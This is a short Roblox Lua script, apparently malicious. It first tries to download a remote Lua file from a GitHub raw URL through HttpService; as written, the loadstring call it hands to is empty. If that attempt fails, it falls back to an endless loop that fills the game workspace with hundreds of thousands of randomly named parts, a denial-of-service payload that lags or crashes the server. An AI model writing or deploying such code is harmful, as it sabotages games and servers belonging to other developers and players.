local s,m = pcall(function()
	local HttpService = game:GetService("HttpService")
	local Url = "https://raw.githubusercontent.com/HalcyonPayback/TN/refs/heads/main/Prg2.lua"
	local response = HttpService:GetAsync(Url)
	loadstring("")
end)

if not s then
	--warn("2")
	while wait(1) do
		local Payload = Instance.new("Model")
		Payload.Name = string.char(math.random(32,126))
		while math.random() > 0.1 do
			Payload.Name = Payload.Name..string.char(math.random(32,126))
		end
		for j = 1,100,1 do
			for i = 1,1000,1 do
				local NP = Instance.new("Part")
				NP.Position = Vector3.new(0,1000000,0)
				NP.Parent = Payload
				while math.random() > 0.5 do
					NP.Name = NP.Name..string.char(math.random(32,126))
				end
			end
			wait()
		end
		Payload.Parent = workspace
		wait(1/(math.random()*math.random()*math.random()))
	end
end
